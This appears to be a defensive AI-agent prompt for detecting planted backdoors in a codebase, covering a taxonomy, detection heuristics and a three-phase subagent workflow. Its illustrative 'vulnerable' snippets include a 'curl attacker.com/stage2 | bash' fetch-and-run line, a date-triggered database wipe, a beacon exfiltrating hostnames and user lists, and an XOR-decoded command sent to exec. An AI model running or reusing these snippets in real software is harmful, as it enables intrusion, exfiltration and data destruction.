# Deliberate Malicious Code / Backdoor Detection

[ref: #backdoors-detection]

You are performing a focused security assessment to find **deliberately planted malicious code** in a codebase. Unlike accidental vulnerabilities, backdoors and implants are intentionally inserted by an adversary (external attacker, compromised maintainer, or insider) to provide covert access, exfiltrate data, or trigger destructive behavior. This skill uses a three-phase approach with subagents: **recon** (find suspicious construction sites), **batched verify** (determine whether each site is a genuine backdoor or a legitimate pattern, in parallel batches of 3), and **merge** (consolidate results).

**Prerequisites**: `{{ REPORTS_ROOT }}/01_architecture.md` must exist. Run the analysis skill first if it doesn't.

## Table of contents

- [What is deliberate malicious code](#what-is-deliberate-malicious-code)
- [Vulnerable vs. Secure Examples](#vulnerable-vs-secure-examples)
- [Backdoor / Implant Taxonomy](#backdoor--implant-taxonomy)
- [Detection heuristics per category](#detection-heuristics-per-category)
- [Execution](#execution)
- [OWASP API Security Top 10 2023 mapping](#owasp-api-security-top-10-2023-mapping)
- [CWE references](#cwe-references)
- [Important Reminders](#important-reminders)
- [References](#references)

---

## What is deliberate malicious code

A backdoor or malicious implant is code intentionally inserted into a project to bypass normal authentication, execute hidden commands, exfiltrate data, establish persistence, or damage systems when a trigger is met. It is not a coding mistake; it is an adversarial capability embedded inside the software supply chain or application source.

The core question: *does this code exist to serve the application, or does it exist to serve an attacker?*

### What a backdoor IS

- A hidden route, endpoint, or condition that grants access or executes a payload without normal authorization.
- Dynamic loading or reflective invocation of code that is not part of the declared dependency graph.
- Runtime decryption or deobfuscation of strings that reveal URLs, commands, keys, or C2 domains.
- Environment-, time-, or event-based triggers that activate dormant malicious logic.
- Anti-debug, anti-VM, or anti-sandbox checks whose only purpose is to evade analysis.
- Domain-generation algorithms (DGAs) or hardcoded C2 infrastructure used for beaconing.
- Code that exfiltrates data, mines cryptocurrency, logs credentials, or wipes data outside the application's intended behavior.

### What a backdoor is NOT

Do not flag these as backdoors:

- **Legitimate feature flags** or admin endpoints protected by strong authentication and audit logging.
- **Dynamic plugin systems** that load vetted, signed modules from a known allowlist.
- **Encrypted configuration** that decrypts at startup using keys from a KMS, HSM, or secure enclave.
- **Defensive checks** such as rootkit detection, anti-tamper, or license enforcement — these may resemble anti-debug but have legitimate business purpose.
- **Test stubs, debug hooks, or easter eggs** in internal tooling, provided they are documented and cannot be reached in production.
- **Legitimate scheduled jobs** (backups, reports, cleanup) that have no covert behavior.

### Patterns that prevent backdoors

When you see these patterns, the code is likely **not a backdoor**:

**1. Signed / verified dynamic loading**
```python
# Only load modules whose signature matches a pinned allowlist
if module_signature not in ALLOWLIST:
    raise ImportError("Untrusted module")
importlib.import_module(module_name)
```

**2. KMS-backed secret decryption**
```python
# Secret is fetched from a KMS, not decrypted by a hardcoded key
secret = kms_client.decrypt(ciphertext_blob=encrypted_secret)["Plaintext"]
```

**3. Mandatory multi-person code review and reproducible builds**
- All changes require at least two reviewers.
- Build pipelines produce signed, reproducible artifacts.
- Dependencies are pinned and checksum-verified.

---

## Vulnerable vs. Secure Examples

### Dynamic loading with a constructed path

```python
# VULNERABLE: dynamically constructs module name from an HTTP header
module_name = request.headers.get("X-Module")
mod = importlib.import_module(module_name)
mod.run(request.json)
# Payload: X-Module: os → attacker can import arbitrary modules

# SECURE: load only from a fixed allowlist
ALLOWED_MODULES = {"reports", "exports", "search"}
module_name = request.headers.get("X-Module")
if module_name not in ALLOWED_MODULES:
    raise ValueError("Invalid module")
mod = importlib.import_module(f"app.plugins.{module_name}")
```

### Reflective invocation of private methods

```java
// VULNERABLE: reflects a user-supplied method name into any object
String method = request.getParameter("action");
Method m = UserService.class.getDeclaredMethod(method, String.class);
m.setAccessible(true);
m.invoke(userService, request.getParameter("arg"));

// SECURE: dispatch through a fixed switch/enum with no reflection
public enum UserAction { RESET_PASSWORD, DISABLE_ACCOUNT }
UserAction action = UserAction.valueOf(request.getParameter("action"));
switch (action) { ... }
```

### Runtime string decryption

```javascript
// VULNERABLE: hex-encoded command decrypted at runtime
function run() {
  const key = 0x42;
  const blob = "1b6c..."; // hex-encoded shell command
  const cmd = Buffer.from(blob, "hex").map(b => b ^ key).toString();
  require("child_process").exec(cmd);
}

// SECURE: no hidden commands; commands are explicit and reviewed
function run() {
  const cmd = config.get("verified.command");
  // cmd is a static allowlisted string loaded from signed config
  spawn(cmd, args);
}
```

### Environment trigger

```python
# VULNERABLE: only executes payload when running outside a known CI image
import os
if not os.path.exists("/opt/ci-marker"):
    os.system("curl attacker.com/stage2 | bash")

# SECURE: behavior does not depend on attacker-controllable environment markers
if os.environ.get("DEPLOY_ENV") in {"prod", "staging"}:
    initialize_telemetry()
```

### Time bomb

```python
# VULNERABLE: payload activates on a specific date
from datetime import datetime
if datetime.now() > datetime(2027, 1, 1):
    wipe_database()

# SECURE: explicit, auditable scheduled maintenance windows
from app.maintenance import is_scheduled_window
if is_scheduled_window("db-cleanup"):
    run_cleanup_with_approval()
```

### Beaconing / C2 callback

```python
# VULNERABLE: periodic callback to an attacker-controlled domain
import requests, time
while True:
    time.sleep(300)
    requests.post("https://update-service-2026.example.com/heartbeat",
                  json={"hostname": os.uname().nodename,
                        "users": get_all_users()})

# SECURE: telemetry to an owned, well-known endpoint with explicit schema
from app.telemetry import send_telemetry
send_telemetry(endpoint=config.TELEMETRY_URL, schema=TELEMETRY_SCHEMA)
```

---

## Backdoor / Implant Taxonomy

| Category | Description | Typical signals |
| --- | --- | --- |
| **Dynamic loading** | Loads code from a runtime-constructed path, downloaded bytes, or anonymous memory instead of normal imports. | `dlopen`, `LoadLibrary`, `importlib.import_module(var)`, `Assembly.Load(byte[])`, `require(pathVar)`, memory-backed modules. |
| **Reflective invocation** | Uses reflection to call methods, access private fields, or instantiate classes outside the normal call graph. | `java.lang.reflect`, `System.Reflection`, `getattr/setattr` on arbitrary names, `Method.invoke` with user input. |
| **Runtime string decryption** | Hardcoded base64/hex blobs, XOR/AES loops, or custom substitution that decode commands, URLs, or keys at runtime. | Functions named `decrypt`, `decode`, `unpack` operating on large literal strings; repeated `atob`/`Buffer.from` on constants. |
| **Environment triggers** | Code that checks for analysis artifacts, specific hostnames, env vars, or missing files before running the payload. | Checks for `/proc/self/status` TracerPID, `LD_PRELOAD`, debugger tool names, VM artifacts, or `CI`/`DEBUG` variables to branch. |
| **Time bombs** | Logic that activates on a fixed date, after an uptime threshold, or after N invocations. | Comparisons against hardcoded dates, `time.time()` deltas, `Date.now()` thresholds, or decrementing counters in long-running loops. |
| **Dead-code activation** | Large, unused-looking functions or "junk" classes that are invoked only through obscure branches, callbacks, or reflection. | Functions with no normal callers but reachable via reflection, eval, or event handlers; heavy obfuscation around a small entry point. |
| **Anti-debug / anti-analysis** | Checks that serve no product purpose and exist only to detect debuggers, sandboxes, or virtual machines. | `IsDebuggerPresent`, `NtQueryInformationProcess`, `/proc/self/status` TracerPID, `ptrace(PTRACE_TRACEME)`, timing checks, VM MAC addresses. |
| **DGA patterns** | Algorithmic generation of candidate C2 domains from a seed such as the current date. | Loops building random-looking domain strings, concatenating consonants/vowels, or hashing a timestamp to produce domains. |
| **Beaconing / C2** | Periodic outbound requests that exfiltrate data or poll for commands. | `setInterval`/`setTimeout` loops issuing HTTP requests, cron jobs calling external URLs, long-polling to dynamic DNS domains. |

---

## Detection heuristics per category

### Dynamic loading

- Look for runtime module loading where the argument is not a compile-time constant: `importlib.import_module(var)`, `LoadLibrary(pathVar)`, `dlopen(buf)`, `Assembly.Load(rawBytes)`.
- Check whether the loaded bytes come from the network, a file upload, or an encrypted blob.
- Verify whether the project uses a signed/allowlisted plugin system; if not, dynamic loading of arbitrary code is high-signal.

### Reflective invocation

- Search for reflection APIs invoked with user-controlled strings: `getDeclaredMethod(name)`, `getattr(obj, name)`, `System.Reflection.Assembly.Load`.
- Flag `setAccessible(true)` or equivalent used to reach private members without a clear legitimate purpose.
- Check whether the reflected names are hardcoded constants (lower risk) or derived from request data (high risk).

### Runtime string decryption

- Identify large base64/hex literals assigned to variables named `payload`, `shell`, `cmd`, `url`, `key`, `secret`.
- Look for loops that XOR, rotate, or AES-decrypt constants before use.
- Trace decrypted values: do they become URLs, shell commands, `eval`/`exec` arguments, or network destinations?

### Environment triggers

- Search for checks of debugger/sandbox/VM artifacts: `IsDebuggerPresent`, `NtQueryInformationProcess`, `/proc/self/status`, `ptrace`, `TracerPID`, `vmware`, `vbox`, `xen`, `sandboxie`.
- Look for branching that performs benign work when the artifact is present and malicious work when it is absent (or vice versa).
- Check for `CI`, `GITHUB_ACTIONS`, `DEBUG` environment variable checks that gate destructive behavior.

### Time bombs

- Search for hardcoded dates, timestamps, or counters used in conditional logic.
- Look for `sleep`/`setTimeout`/`setInterval` combined with destructive operations (file deletion, DB wipes, outbound requests).
- Pay special attention to date comparisons in deployment scripts, cron jobs, or initialization code.

### Dead-code activation

- Find functions or classes that have no static call sites but are referenced by string name in reflection, eval, or event maps.
- Look for unusually large functions hidden inside otherwise small utility files, especially when obfuscated.
- Check `package.json` `postinstall`, `setup.py`, `Makefile`, and CI scripts for hidden activation hooks.

### Anti-debug / anti-analysis

- Treat anti-debug checks as suspicious unless they are part of a documented anti-piracy, anti-tamper, or security product feature.
- Look for exception-based timing checks, `OutputDebugString` flooding, or attempts to hide from `/proc`.
- On macOS, flag `sysctl` checks for `P_TRACED` or `ptrace(PTRACE_DENY_ATTACH)` in non-security software.

### DGA patterns

- Search for loops that concatenate random characters or dictionary words into domain names.
- Look for seeding from `datetime.now()`, `time()`, or hardcoded constants followed by DNS resolution.
- Compare generated strings to known DGA traits: high entropy, nonsensical syllables, mixed TLDs, NXDOMAIN bursts.

### Beaconing / C2

- Find periodic outbound HTTP requests in loops, timers, or cron jobs.
- Check whether the destination is an IP address, dynamic DNS domain, or recently registered domain.
- Look for exfiltration of hostnames, user lists, environment variables, or file listings in request bodies.

---

## Execution

This skill runs in three phases using subagents. Pass the contents of `{{ REPORTS_ROOT }}/01_architecture.md` to all subagents as context.

### Phase 1: Recon — Find Suspicious Construction Sites

Launch a subagent with the following instructions:

> **Goal**: Find every location in the codebase that looks like deliberately planted malicious code: dynamic loading, reflective invocation, runtime string decryption, environment triggers, time bombs, dead-code activation, anti-debug checks, DGA patterns, or beaconing/C2 callbacks. Write results to `{{ REPORTS_ROOT }}/21_recon.md`.
>
> **Context**: You will be given the project's architecture summary. Use it to understand the tech stack, language, frameworks, build pipeline, and normal plugin/extension mechanisms.
>
> **What to search for**:
>
> 1. **Dynamic loading**:
>    - Python: `importlib.import_module(var)`, `__import__(var)`, `imp.load_source`, `ctypes.CDLL` with variable paths.
>    - Node.js: `require(pathVar)`, `import(pathVar)`, `vm.runInNewContext`, `eval` of module code.
>    - Java: `Class.forName(var)`, `Method.invoke` with dynamic names, `URLClassLoader` with constructed URLs.
>    - C#: `Assembly.Load(byte[])`, `Activator.CreateInstance` with dynamic types, reflection on user input.
>    - Go: `plugin.Open` with variable paths, `dlopen`/`dlsym` via cgo.
>    - Native: `dlopen`, `LoadLibrary`, `dlsym`, `GetProcAddress` with non-constant arguments.
>
> 2. **Reflective invocation**:
>    - `java.lang.reflect.*`, `System.Reflection.*`, `getattr`/`setattr` with request-derived names, `call_user_func(var)`.
>
> 3. **Runtime string decryption**:
>    - Large base64/hex literals, XOR/AES/rot loops, custom `decode`/`decrypt`/`unpack` functions whose output reaches `exec`, `eval`, `system`, `subprocess`, `fetch`, or `requests`.
>
> 4. **Environment triggers**:
>    - Checks for debuggers, VMs, sandboxes, CI flags, or specific files before executing sensitive logic.
>
> 5. **Time bombs**:
>    - Hardcoded dates/timestamps, countdowns, or invocation counters that gate destructive behavior.
>
> 6. **Dead-code activation**:
>    - Functions/classes with no normal call sites but reachable via reflection, eval, string dispatch, or build hooks (`postinstall`, `setup.py`, cron, init scripts).
>
> 7. **Anti-debug / anti-analysis**:
>    - `IsDebuggerPresent`, `NtQueryInformationProcess`, `/proc/self/status` TracerPID, `ptrace`, VM/sandbox artifacts, timing checks.
>
> 8. **DGA patterns**:
>    - Code that generates many candidate domains from a seed.
>
> 9. **Beaconing / C2**:
>    - Timers or loops that call external domains/IPs and exfiltrate host or user data.
>
> **What to skip**:
> - Static imports and normal dependency usage.
> - Documented, authenticated admin features.
> - Signed/allowlisted plugin systems.
> - KMS-backed secret retrieval.
>
> **Output format** — write to `{{ REPORTS_ROOT }}/21_recon.md`:
>
> ```markdown
> # Backdoor / Malicious Code Recon: [Project Name]
>
> ## Summary
> Found [N] suspicious construction sites: [X] dynamic loading, [Y] reflective invocation, [Z] string decryption, etc.
>
> ## Suspicious Construction Sites
>
> ### 1. [Descriptive name]
> - **File**: `path/to/file.ext` (lines X-Y)
> - **Function / endpoint**: [name]
> - **Category**: [dynamic loading / reflective invocation / string decryption / environment trigger / time bomb / dead code / anti-debug / DGA / beaconing]
> - **Suspicious pattern**: [the call or construct]
> - **Code snippet**:
>   ```
>   [relevant code]
>   ```
> - **Why it may be malicious**: [one-line rationale]
>
> [Repeat for each site]
> ```

### After Phase 1: Check for Candidates Before Proceeding

After Phase 1 completes, read `{{ REPORTS_ROOT }}/21_recon.md`. If the recon found **zero suspicious sites** (the summary reports "Found 0" or the "Suspicious Construction Sites" section is empty or absent), **skip Phase 2 and Phase 3 entirely**. Instead, write the following content to `{{ REPORTS_ROOT }}/21_backdoors.md` and stop:

```markdown
# Backdoor / Malicious Code Analysis Results

No deliberately malicious code found.
```

Only proceed to Phase 2 if Phase 1 found at least one suspicious site.

### Phase 2: Verify — Determine Genuine Backdoors (Batched)

After Phase 1 completes, read `{{ REPORTS_ROOT }}/21_recon.md` and split the sites into **batches of up to 3 sites each**. Launch **one subagent per batch in parallel**. Each subagent verifies only its assigned sites and writes results to its own batch file.

**Batching procedure**:

1. Read `{{ REPORTS_ROOT }}/21_recon.md` and count the numbered site sections (`### 1.`, `### 2.`, etc.).
2. Divide them into batches of up to 3. For example, 8 sites → 3 batches (1-3, 4-6, 7-8).
3. For each batch, extract the full text of those site sections from the recon file.
4. Launch all batch subagents **in parallel**, passing each one only its assigned sites.
5. Each subagent writes to `{{ REPORTS_ROOT }}/21_batch_N.md` where N is the 1-based batch number.
6. Identify the project's primary language/framework from `{{ REPORTS_ROOT }}/01_architecture.md` and select **only the matching examples** from the "Vulnerable vs. Secure Examples" section above. Include these selected examples in each subagent's instructions where indicated by `[TECH-STACK EXAMPLES]` below.

Give each batch subagent the following instructions:

> **Goal**: For each assigned suspicious construction site, determine whether it is a deliberately planted backdoor or implant, or whether it has a legitimate explanation. Write results to `{{ REPORTS_ROOT }}/21_batch_[N].md`.
>
> **Your assigned sites** (from the recon phase):
>
> [Paste the full text of the assigned site sections here, preserving the original numbering]
>
> **Context**: You will be given the project's architecture summary. Use it to understand the tech stack, normal plugin/extension mechanisms, and authorized administrative features.
>
> **Backdoor reference — what to look for**:
>
> For each site, answer these questions:
>
> 1. **Is the code required for the application's documented behavior?**
>    - Does the feature make sense in the file where it appears?
>    - Is it reachable through normal user flows, or only through reflection, hidden headers, or build hooks?
> 2. **Does the code hide its intent?**
>    - Are strings encrypted or encoded?
>    - Is the control flow obfuscated?
>    - Are there anti-debug or anti-sandbox checks?
> 3. **Does the code contact external infrastructure?**
>    - Is the destination owned by the organization?
>    - Is it an IP address, dynamic DNS, or DGA-style domain?
>    - Does it exfiltrate data?
> 4. **Does the code have a destructive or unauthorized trigger?**
>    - Time bomb, environment trigger, absence trigger, counter trigger?
>    - Can it delete data, execute OS commands, or disable security controls?
>
> **Vulnerable vs. secure examples for this project's tech stack**:
>
> [TECH-STACK EXAMPLES]
>
> **Classification**:
> - **Confirmed Backdoor / Implant**: Code has no legitimate purpose and is designed to provide covert access, exfiltrate data, or trigger malicious behavior.
> - **Likely Backdoor / Implant**: Strong adversarial indicators but some uncertainty about intent or reachability.
> - **Suspicious but Legitimate**: Unusual pattern but has a plausible product purpose (e.g., documented plugin system, license enforcement, diagnostic feature).
> - **Needs Manual Review**: Cannot determine intent from code alone; requires maintainer interview or runtime analysis.
>
> **Required fields for every finding**:
> - **OWASP API 2023 root-cause risk**: choose API8:2023 Security Misconfiguration and/or API10:2023 Unsafe Consumption of APIs, and explain why.
> - **CWE**: map to the most specific CWE from the reference (e.g., CWE-912, CWE-78, CWE-94, CWE-506, CWE-507).
> - **Dynamic test / verification**: describe a safe, read-only check to confirm the behavior (e.g., inspect decoded strings, review git history of the insertion, check domain ownership).
>
> **Output format** — write to `{{ REPORTS_ROOT }}/21_batch_[N].md`:
>
> ```markdown
> # Backdoor / Malicious Code Batch [N] Results
>
> ## Findings
>
> ### [CONFIRMED BACKDOOR] Descriptive name
> - **File**: `path/to/file.ext` (lines X-Y)
> - **Endpoint / function**: [name]
> - **OWASP API 2023 root-cause risk**: [API8 / API10 / both]
> - **CWE**: [CWE-912 / CWE-78 / CWE-94 / CWE-506 / CWE-507 / ...]
> - **Issue**: [e.g., "Runtime-decrypted shell command executed from X-Module header"]
> - **Taint trace / trigger**: [how the backdoor is reached and what activates it]
> - **Impact**: [covert access, data exfiltration, destructive payload, etc.]
> - **Evidence**:
>   ```
>   [code snippet]
>   ```
> - **Remediation**: [remove the implant, rotate secrets, audit access, report incident]
> - **Verification Steps**:
>   ```
>   [safe read-only confirmation steps]
>   ```
>
> ### [LIKELY BACKDOOR] Descriptive name
> ...
>
> ### [SUSPICIOUS BUT LEGITIMATE] Descriptive name
> ...
>
> ### [NEEDS MANUAL REVIEW] Descriptive name
> ...
> ```

### Phase 3: Merge — Consolidate Batch Results

After **all** Phase 2 batch subagents complete, read every `{{ REPORTS_ROOT }}/21_batch_*.md` file and merge them into a single `{{ REPORTS_ROOT }}/21_backdoors.md`. You (the orchestrator) do this directly — no subagent needed.

**Merge procedure**:

1. Read all `{{ REPORTS_ROOT }}/21_batch_1.md`, `{{ REPORTS_ROOT }}/21_batch_2.md`, ... files.
2. Collect all findings from each batch file and combine them into one list, preserving the original classification and all detail fields.
3. Count totals across all batches for the executive summary.
4. Write the merged report to `{{ REPORTS_ROOT }}/21_backdoors.md` using this format:

```markdown
# Backdoor / Malicious Code Analysis Results: [Project Name]

## Executive Summary
- Suspicious sites analyzed: [total across all batches]
- Confirmed Backdoor / Implant: [N]
- Likely Backdoor / Implant: [N]
- Suspicious but Legitimate: [N]
- Needs Manual Review: [N]

## Findings

[All findings from all batches, grouped by classification:
 CONFIRMED BACKDOOR first, then LIKELY BACKDOOR, then NEEDS MANUAL REVIEW, then SUSPICIOUS BUT LEGITIMATE.
 Preserve every field from the batch results exactly as written.]
```

5. After writing `{{ REPORTS_ROOT }}/21_backdoors.md`, **delete all intermediate batch files** (`{{ REPORTS_ROOT }}/21_batch_*.md`).

---

## OWASP API Security Top 10 2023 mapping

| OWASP Risk | Why Backdoors / Malicious Code Matter |
|---|---|
| **API8:2023 Security Misconfiguration** | Hidden endpoints, unauthorized dynamic loading, and weak build-pipeline controls allow implants to persist. |
| **API10:2023 Unsafe Consumption of APIs** | Backdoors may abuse third-party integrations, beacon to external C2, or reflectively load untrusted code. |

---

## CWE references

- CWE-912: Hidden Functionality
- CWE-78: OS Command Injection
- CWE-94: Improper Control of Generation of Code ('Code Injection')
- CWE-506: Embedded Malicious Code
- CWE-507: Trojan Horse
- CWE-509: Trigger-Based Logical Bombs
- CWE-912 is the parent weakness for most findings produced by this scan.

---

## Important Reminders

- Backdoor detection is **inherently judgment-based**. A finding of "Confirmed Backdoor" should be reserved for code that clearly has no legitimate purpose and contains adversarial indicators (hidden triggers, obfuscation, C2, exfiltration).
- Always check **git history** for the insertion: `git log -p --follow -- <file>` and `git blame -L <start>,<end> <file>`. A backdoor inserted in a single commit by an unknown author is higher confidence than code that evolved over many reviewed commits.
- Check **dependency provenance**: if the suspicious code is in a third-party package, verify the package author, version history, and whether it is typosquatting or a compromised release.
- Do **not** run destructive or exfiltrating code. Verification must be read-only (string decoding, static analysis, domain lookup, git inspection).
- Preserve evidence before remediation: screenshots, commit hashes, decoded strings, and file hashes.
- If a confirmed backdoor is found, treat it as an **incident**: rotate credentials, audit access, review build pipeline integrity, and notify stakeholders.
- Subagents are read-only: they must not modify project source code, commit changes, or run potentially malicious code.

---

## References

- MITRE ATT&CK T1620 — Reflective Code Loading
- MITRE ATT&CK T1622 — Debugger Evasion
- MITRE ATT&CK T1497 — Virtualization/Sandbox Evasion
- OWASP API Security Top 10 2023 — API8:2023 Security Misconfiguration
- OWASP API Security Top 10 2023 — API10:2023 Unsafe Consumption of APIs
- CWE-912: Hidden Functionality
- CWE-506: Embedded Malicious Code
- CWE-507: Trojan Horse
- CWE-509: Trigger-Based Logical Bombs
